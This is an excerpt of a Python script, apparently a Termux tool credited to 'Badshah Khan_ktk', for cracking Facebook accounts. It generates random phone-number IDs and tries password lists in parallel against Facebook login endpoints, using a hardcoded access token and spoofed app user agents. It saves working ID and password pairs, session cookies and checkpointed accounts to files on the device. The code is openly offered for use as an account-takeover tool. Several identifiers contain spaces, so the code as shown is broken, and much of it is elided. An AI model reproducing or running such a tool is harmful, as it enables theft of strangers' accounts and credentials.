...
try:
	...
	os.system('python Badshah Khan.py')
...
\033[1;91m   | '--------------' || '--------------' || '--------------' |
 ...
 \033[1;91m   -------------------------------
\033[1;37m--------------------------------------------------
 [\033[1;32m*\033[1;37m] Author   : Badshah Khan_ktk
 [\033[1;32m*\033[1;37m] Facebook : Badshah Khan_ktk
  [\033[1;32m*\033[1;37m] FRAND :J9k34_DP
 [\033[1;32m*\033[1;37m] Tool     : FREE
 [\033[1;32m*\033[1;37m] Version  : 0.0.9
\033[1;37m--------------------------------------------------
 [\033[1;32m*\033[1;37m]\033[1;33mYOUR ACCOUNTs ARE SAVE IN:\033[1;32m/sdcard/Badshah Khan-OK.txt\033[1;37m
\033[1;37m--------------------------------------------------""")
def linex():
	print('\033[1;37m--------------------------------------------------')
def clear():
...
def ind():
		...
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as Badshah Khan:	
			clear()
			tl = str(len(user))
			print(' Total ids : \033[1;32m'+tl+f' ')
			print(f'\033[1;37m Choice code  :\033[1;32m '+code)
			...
			for psx in user:
				...
				if mthd in ['1','01']:
					Badshah Khan.submit(Badshah Khan4,ids,passlist)
...
def api1(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write('\r\r\033[1;37m [Badshah Khan-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
			...
			for pw in passlist:
				...
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;32m [Badshah Khan-OK] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/Badshah Khan-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\x1b[38;5;205m [Badshah Khan-CP] '+ids+' | '+pas+'\033[1;97m')
						open('/sdcard/Badshah Khan-CP.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcard/Badshah Khan-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [Badshah Khan-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        fbfw = '1'
                        fbrv = '0'
                        fban = '[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/Badshah Khan-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/Badshah Khan-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[Badshah Khan-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
...
#method4
def Badshah Khan4(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [Badshah Khan-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [Badshah Khan-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print('\033[1;32m [\033[1;37mBISCUIT\033[1;32m]\033[1;37m '+coki)
                                        open('/sdcard/Badshah Khan-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/Badshah Khan-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\033[1;33m [Badshah Khan-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Badshah Khan-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
